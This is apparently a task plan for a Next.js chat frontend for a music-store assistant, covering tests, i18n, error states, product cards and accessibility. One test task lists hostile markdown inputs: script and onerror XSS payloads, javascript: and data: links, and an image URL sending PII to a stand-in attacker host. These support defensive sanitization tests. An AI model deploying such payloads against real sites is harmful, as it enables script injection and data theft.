---

description: "Task list for 003 Chat web (epic #9)"
---

# Tasks: Chat web

**Input**: Design documents from `specs/003-chat-web/`

**Prerequisites**: [plan.md](plan.md), [spec.md](spec.md), [research.md](research.md),
[data-model.md](data-model.md), [contracts/ui-rendering.md](contracts/ui-rendering.md)

**Tests**: required. FR-016 asks for automated coverage of every `.sse` fixture and every
`http-*` error state, and constitution IV requires tests before done. Within each story, write the
test first and see it fail.

**Organization**: grouped by user story and delivered in **3 PRs** (scope cut after the PR #32
review). Paths are relative to the repository root; frontend commands run in `frontend/`.

Before using any `ai`, `@ai-sdk/react`, `streamdown` or Next API, check its type definitions in
`frontend/node_modules` and `frontend/node_modules/next/dist/docs/` (see `frontend/AGENTS.md`).

Do not add `export const dynamic`. Do not read random ids or `chat.id` during render (R10).

## Format: `[ID] [P?] [Story] Description`

- **[P]**: can run in parallel (different files, no dependency on an incomplete task)
- **[Story]**: user story from spec.md (US1–US4)

---

# PR 1 — Foundation + US1 (`Part of #9`)

## Phase 1: Setup

- [x] T001 Add dev deps `jsdom`, `@testing-library/react`, `@testing-library/user-event`, `@testing-library/jest-dom` and runtime dep `streamdown` (2.7.x) with `pnpm add` in `frontend/package.json` (lockfile updated)
- [x] T002 Create `frontend/vitest.config.ts`:
  - `@/` → `src/` alias;
  - two `test.projects`: node for `**/*.test.ts`, jsdom for `**/*.test.tsx`. Confirm the API in the `node_modules/vitest` types (`environmentMatchGlobs` is gone in recent vitest);
  - `setupFiles: ["src/test/setup.ts"]`;
  - keep `src/lib/chat/contract.test.ts` passing.
- [x] T003 [P] Create `frontend/src/test/setup.ts`: import `@testing-library/jest-dom/vitest` and `cleanup()` after each test. Polyfill streams only if a jsdom test proves they are missing.
- [x] T004 [P] Add shadcn primitives with `pnpm dlx shadcn@latest add textarea card badge alert` into `frontend/src/components/ui/` (base-nova, generated files untouched beyond lint fixes)
- [x] T005 [P] Add `@source "../../node_modules/streamdown/dist/*.js";` to `frontend/src/app/globals.css` (Tailwind v4 must scan Streamdown's classes, otherwise tables and code lose their styling)

## Phase 2: Foundational

**⚠️ Blocks all stories.**

- [x] T006 Create `frontend/src/test/fixtures.ts` by extracting the helpers in `src/lib/chat/contract.test.ts`:
  - `FIXTURES_DIR`, `readFixture(name)`, `parseChunks(name)`;
  - `assembleMessage(name): Promise<ChatMessage>` (via `readUIMessageStream`);
  - `fixtureFetch(nameOrNames, {truncate?})` returning a `typeof fetch`:
    - `.sse` files → `text/event-stream` Response with `x-vercel-ai-ui-message-stream: v1`;
    - `http-*.json` → `Response.json(body, {status, headers})`;
    - an array serves the names in order (for retry tests);
    - `truncate: true` drops the `finish` chunk and `[DONE]`;
    - it records request bodies for assertions.
- [x] T007 Refactor `frontend/src/lib/chat/contract.test.ts` to use `src/test/fixtures.ts` (behaviour unchanged)
- [x] T008 [P] Create `frontend/src/lib/chat/types.ts`:
  - `Availability = "in_stock" | "out_of_stock" | "coming_soon" | "discontinued"`;
  - `ProductCard = {id: number; name: string; categoryId: number; priceBrl: number; promoPriceBrl: number | null; discountPercent: number | null; availability: Availability}` ("nullable fields are always present");
  - `ChatDataParts = {products: {products: ProductCard[]}}`;
  - `ChatMetadata = {route: {intent: string; confidence: number; router: "jev" | "haiku" | "fake"}; model: string; usage: {inputTokens: number; outputTokens: number}}`;
  - `ChatMessage = UIMessage<ChatMetadata, ChatDataParts>`.
- [x] T009 [P] Create `frontend/src/lib/i18n/pt-BR.ts`: the catalog, `as const`, exporting the type `Messages`. Sections:
  - `app`: store name, "Melody".
  - `emptyState`: greeting plus 4 suggestions: "Vocês têm violão até R$ 1.000?", "Quais promoções estão ativas?", "Como faço para trocar um produto?", "Quais as formas de pagamento?".
  - `input`: placeholder, send, stop.
  - `status`: "Melody está digitando…".
  - `tools`: the 11 contract labels, verbatim:

    | Tool | Label |
    |---|---|
    | `search_products` | "Buscando no catálogo…" |
    | `get_product` | "Consultando o produto…" |
    | `find_similar_products` | "Procurando opções parecidas…" |
    | `get_active_promotions` | "Verificando promoções…" |
    | `calculate_payment_options` | "Calculando formas de pagamento…" |
    | `get_order_status` | "Consultando seu pedido…" |
    | `search_policies` | "Consultando as políticas da loja…" |
    | `get_store_info` | "Buscando informações da loja…" |
    | `request_return` | "Abrindo solicitação de devolução…" |
    | `register_complaint` | "Registrando sua reclamação…" |
    | `handoff_to_human` | "Chamando um atendente…" |
    | `fallback` | "Consultando…" |

  - `toolState`: done and failed suffixes.
  - `availability`: in_stock "Em estoque", out_of_stock "Esgotado", coming_soon "Em breve", discontinued "Fora de linha".
  - `product`: discount "-{percent}", original-price a11y label.
  - `errors`: fallback, retry "Tentar novamente", countdown "Você poderá enviar em {seconds}s".
  - `login`: sessionExpired "Sua sessão expirou. Entre novamente para continuar.", placeholder "O login estará disponível em breve.". No issue numbers in user-facing copy.
  - `markdown`: pt-BR values for the Streamdown `translations` keys that can still appear with controls off (e.g. `openLink`, `externalLinkWarning`, `close`).
- [x] T010 [P] Create `frontend/src/lib/i18n/index.tsx` exporting:
  - `locale = "pt-BR"`;
  - a `MessagesContext` defaulting to pt-BR, with `useMessages()` (client) and `getMessages(locale)` (server);
  - `format(template, vars)` for `{name}` interpolation.

  Test it in `frontend/src/lib/i18n/index.test.ts`:
  - interpolation works;
  - `Object.keys(messages.tools)` equals a const list of the 11 contract tool names plus `fallback`.
- [x] T011 [P] Create `frontend/src/lib/format.ts`:
  - `formatBrl(value, locale)` uses `Intl.NumberFormat(locale, {style: "currency", currency: "BRL"})`;
  - `formatPercent(value)` returns the integer plus "%". It must not use Intl's percent style.

  Test it in `frontend/src/lib/format.test.ts`, normalizing NBSP in assertions: 899 → "R$ 899,00", 699.9 → "R$ 699,90", `formatPercent(20)` → "20%".
- [x] T012 [P] Create `frontend/src/lib/chat/tool-state.ts`:
  - `toToolDisplayState(state)`: `input-streaming`, `input-available` and approval states → `running`; `output-available` → `done`; `output-error` → `failed`;
  - `toolLabel(toolName, messages)` → `messages.tools[toolName] ?? messages.tools.fallback`.

  Test it in `frontend/src/lib/chat/tool-state.test.ts`.
- [x] T013 Write failing tests in `frontend/src/lib/chat/errors.test.ts` for `toChatError`. Build an `APICallError` from each `http-*.json` fixture (statusCode, plus `JSON.stringify(body)` as responseBody), then expect:
  - 401 → `unauthorized`;
  - 429 `rate_limited` → `rate_limited`, body message, `retryAfterSeconds: 30`;
  - 429 `budget_exhausted` → `budget_exhausted`, body message;
  - 500 → `retryable`, body message;
  - 400 `invalid_request` → `retryable`;
  - `rate_limited` with no `retryAfterSeconds` → 60;
  - non-JSON body (`<html>`) → `retryable` with `messages.errors.fallback`;
  - bare `new Error("<errorText>")` → `retryable` with that text;
  - `TypeValidationError`, `JSONParseError` (any `AISDKError`), `TypeError("Failed to fetch")` and `AbortError` → `retryable` with the fallback, never their own text.
- [x] T014 Implement `frontend/src/lib/chat/errors.ts`: the `ChatErrorState` union exactly as in data-model.md, using `APICallError.isInstance` and `AISDKError.isInstance` from `ai`. Done when T013 passes.
- [x] T015 [P] Create `frontend/src/lib/chat/mode.ts` with `chatMode(env)`: `CHAT_MODE ?? (NODE_ENV === "production" ? "backend" : "mock")`. Use it in `frontend/src/app/api/chat/route.ts`. Test in `frontend/src/lib/chat/mode.test.ts`: unset + production → backend, unset + development → mock, explicit value wins (FR-011).

## Phase 3: User Story 1 — Ask Melody and see the answer stream in (P1) 🎯 MVP

**Independent test:** render `<Chat fetch={fixtureFetch("plain-text")}/>` and send "Oi". The user bubble and typing indicator should appear, then the markdown answer, and the input should become usable again.

### Tests first

- [x] T016 [P] [US1] `frontend/src/components/chat/message-view.test.tsx`:
  - `assembleMessage("plain-text")` renders markdown (bold → `<strong>`); metadata is not rendered.
  - Hostile markdown (test-only message) is neutralized. The input contains `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<iframe src="https://x">`, `![](https://attacker.test/?q=pii)`, `[a](javascript:alert(1))` and `[b](data:text/html;base64,xx)`. Assert:
    - no `img`, `iframe` or `script` element is in the container;
    - no anchor has a `javascript:` or `data:` href;
    - an `https://` link renders with `target="_blank"` and `rel` containing `noopener`.
- [x] T017 [P] [US1] `frontend/src/components/chat/chat-input.test.tsx`:
  - Enter calls `onSend` with the trimmed text, clears the textarea, and focus stays on it;
  - Shift+Enter inserts a newline;
  - blank text cannot be sent;
  - the textarea has `maxLength` 2000;
  - when `busy`, the Stop button calls `onStop` and send is blocked;
  - when `disabled`, the textarea and buttons are disabled.
- [x] T018 [P] [US1] `frontend/src/components/chat/chat.test.tsx` (flow):
  - The empty state shows the greeting and 4 suggestions. Clicking one sends it.
  - After a send, the user bubble and "Melody está digitando…" appear, then the `plain-text` answer.
  - The polite live region contains the answer once.
  - A second message reuses the same chat `id` (check the recorded request bodies).
  - Double Enter, or a double click on Send in the same tick, results in one `fetch` call and one user bubble (FR-019).
  - Stop mid-stream keeps the partial text, shows no error notice, and leaves the input enabled.
  - A truncated `plain-text` (`{truncate: true}`) keeps the partial text and shows a retryable notice with the catalog fallback.

### Implementation

- [x] T019 [P] [US1] `frontend/src/components/chat/markdown.tsx`: a client wrapper around `Streamdown`, hardened per research R4:
  - `rehypePlugins={[defaultRehypePlugins.sanitize, [harden, {allowedLinkPrefixes: ["https://", "http://", "mailto:"], allowedImagePrefixes: [], allowedProtocols: ["https", "http", "mailto"], allowDataImages: false}]]}`, with **no `raw`**;
  - `components={{img: () => null, a: …target="_blank" rel="noopener noreferrer"}}`;
  - `controls={false}`;
  - `translations` from `useMessages().markdown`;
  - `mode` set to `streaming` while streaming, otherwise `static`;
  - wrappers with `min-w-0 break-words`, and `overflow-x-auto` on tables and code.

  Confirm every prop in `node_modules/streamdown/dist/index.d.ts`. Done when T016's hostile case passes.
- [x] T020 [P] [US1] `frontend/src/components/chat/typing-indicator.tsx`: copy from `useMessages().status.typing`, `role="status"`, `animate-pulse motion-reduce:animate-none`.
- [x] T021 [P] [US1] `frontend/src/components/chat/empty-state.tsx` (`{onPick(text)}`): greeting and suggestion buttons, each at least 44 px.
- [x] T022 [P] [US1] `frontend/src/components/chat/chat-input.tsx` (`{disabled, busy, onSend, onStop}`): shadcn `Textarea` + `Button`, `maxLength={2000}`, focus returns to the textarea after send. Done when T017 passes.
- [x] T023 [US1] `frontend/src/components/chat/message-view.tsx` (`{message: ChatMessage, streaming?: boolean}`):
  - user bubbles on the right, assistant bubbles on the left;
  - render `parts` in order: `text` → `Markdown`; other parts → `null` (US2 extends this).

  Done when T016 passes.
- [x] T024 [US1] `frontend/src/components/chat/message-list.tsx`:
  - a `role="log"` scroll container rendering one `MessageView` per message, with a slot for the typing indicator;
  - stick-to-bottom: auto-scroll only when the view is within about 80 px of the bottom;
  - a visually hidden `aria-live="polite"` region that announces each finished assistant answer once.
- [x] T025 [P] [US1] `frontend/src/components/chat/chat-header.tsx`: store name and "Melody", from `useMessages().app`.
- [x] T026 [US1] `frontend/src/components/chat/chat.tsx` (`"use client"`, `{fetch?: typeof fetch}`):
  - **Transport:** `useChat<ChatMessage>({transport: new DefaultChatTransport({api: "/api/chat", fetch})})`, with the transport memoized.
  - **Typing indicator:** shown when `status === "submitted"`, or when streaming with no visible part yet.
  - **Stop:** wire `stop()`.
  - **Double-send guard (R12):** a `sendingRef` blocks a second send.
  - **Dropped stream (research R2):** in `onFinish`, `!isAbort && !isError && finishReason == null` sets a local retryable error. Clear it on retry or on the next send.
  - **Layout:** `h-dvh` flex column with header, list, and the input pinned to the bottom.
  - **Privacy:** no `console.*` with message content (FR-017).

  Done when T018 passes.
- [x] T027 [US1] Replace `frontend/src/app/page.tsx` with a server page rendering `<Chat/>`. In `frontend/src/app/layout.tsx`, set `<html lang={locale}>`. Run `pnpm build` and fix any Cache Components prerender error (R10).
- [x] T028 PR 1 gate: `pnpm lint && pnpm typecheck && pnpm test && pnpm build` green; open PR 1 (`Part of #9`)

---

# PR 2 — US2 + US3 (`Part of #9`)

## Phase 4: User Story 2 — Tool status and product cards (P1)

**Independent test:** `tool-products` shows the done status "Buscando no catálogo…" and 2 cards with the exact fixture values. `tool-error` shows a failed status and no error code.

- [x] T029 [P] [US2] `frontend/src/components/chat/tool-status.test.tsx`:
  - running, done and failed render the label plus a distinct state (the accessible name includes the state suffix);
  - an unknown tool shows "Consultando…";
  - the technical tool name never appears in the DOM.
- [x] T030 [P] [US2] `frontend/src/components/chat/product-cards.test.tsx`:
  - The `tool-products` products show the names "Tagima Woodstock Dreadnought Natural" and "Yamaha F310 Aço Natural", the prices "R$ 899,00" and "R$ 699,90", and the badge "Em estoque".
  - A product with `promoPriceBrl: 160, priceBrl: 200, discountPercent: 20` shows:
    - "R$ 160,00";
    - "R$ 200,00", struck through (`<s>`);
    - "-20%".
  - An unknown `availability` shows no badge.
  - `[]` renders nothing.
  - A long name wraps.
- [x] T031 [P] [US2] Extend `message-view.test.tsx`:
  - `tool-products` renders the done tool status, then the 2 cards, then the text, in that order;
  - `tool-error` renders a failed status, no "verification_failed", and the recovery text;
  - an unknown `data-*` part is ignored.
- [x] T032 [P] [US2] `frontend/src/components/chat/tool-status.tsx` (`{toolName, state}`):
  - running: lucide `Loader2`, spinning, with `motion-reduce:animate-none`;
  - done: `Check`;
  - failed: `AlertCircle`, muted;
  - never renders tool input, output or `errorText`.

  Done when T029 passes.
- [x] T033 [P] [US2] Card components:
  - `frontend/src/components/chat/product-card.tsx` (`{product}`): one card (shadcn `Card` + `Badge`), formatting with `formatBrl(value, locale)` and `formatPercent`. No arithmetic on values (constitution I).
  - `frontend/src/components/chat/product-cards.tsx` (`{products}`): a `grid grid-cols-1 sm:grid-cols-2 gap-2` grid that renders nothing for `[]`.

  Done when T030 passes.
- [x] T034 [US2] Extend `message-view.tsx`: `isToolUIPart` → `ToolStatus` with `getToolName`; `data-products` → `ProductCards`; ignore other parts. Done when T031 passes.

## Phase 5: User Story 3 — Errors and limits (P1)

**Independent test:** flow tests with `fixtureFetch` for each `http-*` fixture and for `stream-error`.

- [x] T035 [P] [US3] `frontend/src/components/chat/chat-error.test.tsx`. Use `vi.useFakeTimers({toFake: ["setInterval"]})` and `userEvent.setup({advanceTimers: vi.advanceTimersByTime})`.
  - `rate_limited` shows the message and a countdown that decreases, and calls `onExpire` at 0.
  - `budget_exhausted` shows the message and no retry button.
  - `retryable` shows the message and "Tentar novamente", which calls `onRetry`.
  - The root has `role="alert"`.
  - No status codes or error codes are rendered.
- [x] T036 [US3] Extend `chat.test.tsx`. Mock `useRouter` from `next/navigation` and use the same fake-timer setup as T035.
  - `http-401` → `replace("/login?reason=expired&callbackUrl=/")`.
  - `http-429-rate-limited`:
    - the notice shows the fixture message and the textarea is disabled;
    - after 30 s the textarea is enabled again and "Tentar novamente" appears;
    - retry with `fixtureFetch(["http-429-rate-limited", "plain-text"])` answers, with exactly one user bubble.
  - `http-429-budget-exhausted` → disabled, no retry.
  - `fixtureFetch(["http-500", "plain-text"])` then retry → the answer renders, with exactly one user bubble, and focus returns to the input.
  - `stream-error` keeps the partial "Deixa eu verificar isso pra você", shows the `errorText`, and offers retry.
- [x] T037 [P] [US3] `frontend/src/components/chat/chat-error.tsx` (`{error, onRetry, onExpire}`):
  - shadcn `Alert` with `role="alert"`;
  - the countdown uses `setInterval`, cleared on unmount;
  - the server message is shown, with the catalog fallback when there is none.

  Done when T035 passes.
- [x] T038 [US3] Wire errors in `chat.tsx` using `toChatError(error)`, with these behaviours:

  | Error | Behaviour |
  |---|---|
  | `unauthorized` | Effect calls `router.replace("/login?reason=expired&callbackUrl=/")` |
  | `rate_limited` | Input disabled until `onExpire`; then input re-enabled and retry offered |
  | `budget_exhausted` | Local `locked` state; input disabled for the rest of the page session |
  | `retryable` (and local dropped-stream) | Retry button |

  Retry runs `clearError(); regenerate();` and then focuses the input. `ChatError` renders after the last message. Done when T036 passes.
- [x] T039 [P] [US3] `frontend/src/components/login/login-notice.tsx` (`"use client"`): reads `useSearchParams()`; when `reason === "expired"`, shows an `Alert` with the catalog copy.
- [x] T040 [US3] `frontend/src/app/login/page.tsx`: a server page using `getMessages(locale)`, with a heading, the placeholder note, `<Suspense><LoginNotice/></Suspense>` (required under Cache Components) and a link back to `/`. `pnpm build` passes.
- [x] T041 PR 2 gate: lint, typecheck, test and build green; open PR 2 (`Part of #9`)

---

# PR 3 — US4 + polish (`Closes #9`)

## Phase 6: User Story 4 — Phone (P2)

**Independent test:** a manual 375 × 667 replay of every quickstart row, with a screenshot in the PR.

- [x] T042 [US4] Responsive and a11y fixes in `chat.tsx`, `message-list.tsx`, `message-view.tsx`, `markdown.tsx`, `product-cards.tsx` and `chat-input.tsx`:
  - bubbles `max-w-[85%] sm:max-w-[75%]`;
  - `overflow-x-hidden` on the list;
  - `pb-[env(safe-area-inset-bottom)]` on the input bar;
  - every button `min-h-11` (at least 44 px).
- [x] T043 [US4] `export const viewport` in `frontend/src/app/layout.tsx` (`width: "device-width", initialScale: 1, viewportFit: "cover"`). Check the Next 16 `viewport` docs in `node_modules/next/dist/docs`.

## Phase 7: Polish

- [x] T044 [P] Copy and colour audit:
  - grep `frontend/src/components` and `frontend/src/app` for user-visible JSX string literals and move them into the catalog (SC-005);
  - grep for `#[0-9a-fA-F]{3,6}` and `rgb(`; only theme tokens are allowed (FR-015).
- [x] T045 [P] Privacy audit: no `console.*` with message or part content in `frontend/src` (FR-017)
- [ ] T046 Run [quickstart.md](quickstart.md) manually, covering:
  - all rows;
  - the image/no-request check;
  - the production fail-closed check;
  - 375 px.

  Attach a screenshot to the PR.
- [ ] T047 Final gate:
  - lint, typecheck, test and build green;
  - update DL-009 in `docs/decision-log.md` with the implementation outcomes;
  - update `docs/HANDOFF.md`;
  - open PR 3 with `Closes #9`.

---

## Dependencies & Execution Order

- PR 1: Setup → Foundational → US1. PR 2: US2 and US3. US2 touches `message-view.tsx` and US3 touches `chat.tsx`, so they can proceed in parallel. PR 3 comes after both.
- Within a story, tests come first (and must fail), then leaf components [P], then composites, then page wiring.

### Parallel opportunities

- PR 1:
  - T003–T005 together;
  - T008–T012 and T015 together;
  - T013 → T014;
  - T016–T018 together;
  - T019–T022 and T025 together;
  - then T023 → T024 → T026 → T027.
- PR 2:
  - T029–T031 together, then T032 and T033 together, then T034;
  - T035 and T039 together, then T037, then T038 and T040.

## Implementation Strategy

1. **PR 1** gives the MVP: a streaming chat on the mock, hardened markdown, and fail-closed production mode.
2. **PR 2** adds grounding visibility (tools and cards) and the error states.
3. **PR 3** adds mobile, a11y and audits, and closes #9.

Each PR keeps lint, typecheck, test and build green. Implementation starts only after the spec PR (#32) is merged.
